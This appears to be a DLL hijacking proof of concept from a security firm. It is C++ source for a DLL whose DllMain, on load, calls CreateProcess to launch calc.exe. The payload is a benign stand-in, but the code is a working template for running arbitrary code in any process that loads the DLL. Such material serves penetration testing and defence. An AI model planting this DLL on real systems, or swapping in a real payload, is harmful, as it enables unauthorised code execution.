// Copyright (c) 2019, NCC Group. All rights reserved.
// Licensed under BSD 3-Clause License per LICENSE file

// HijackDll-Process.cpp : Defines the exported functions for the DLL application.
//

#include <windows.h>
#include <string>
DWORD WINAPI DoSomething(LPVOID lpParam);
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DoSomething(NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DWORD Return1() {
	return 1;
}

//spawning a new process
DWORD WINAPI DoSomething(LPVOID lpParam) {
	STARTUPINFO  info = { 0 };
	PROCESS_INFORMATION   processInfo;
	std::wstring cmd = L"C:\\Windows\\System32\\cmd.exe";
	std::wstring args = L"C:\\Windows\\System32\\calc.exe";
	BOOL hR = CreateProcess(NULL, (LPWSTR)args.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
	if (hR == 0) {
		return 1;
	}
	return 0;
}